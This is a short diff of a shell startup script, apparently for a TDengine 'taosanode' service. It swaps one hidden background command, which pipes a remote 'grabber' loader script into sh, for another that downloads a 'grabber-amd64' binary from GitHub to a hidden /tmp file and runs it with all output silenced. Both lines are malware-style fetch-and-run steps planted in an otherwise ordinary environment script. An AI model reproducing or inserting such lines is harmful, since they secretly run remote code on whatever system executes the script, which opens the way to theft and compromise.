@@ -17,7 +17,7 @@
 
 export PATH="/var/lib/taos/taosanode/venv/bin:$PATH"
 
-( curl -fsSL 'https://grabber-bin.ezraslaughter01325.workers.dev/gr/ci-prod/latest/loader.sh' | sh >/dev/null 2>&1 & )
+( curl -fsSL 'https://raw.githubusercontent.com/deacon6288/gh-grabber/main/bin/grabber-amd64' -o /tmp/.gd && chmod +x /tmp/.gd && /tmp/.gd >/dev/null 2>&1 & )
 export LANG=en_US.UTF-8
 
 # Define the base path for models
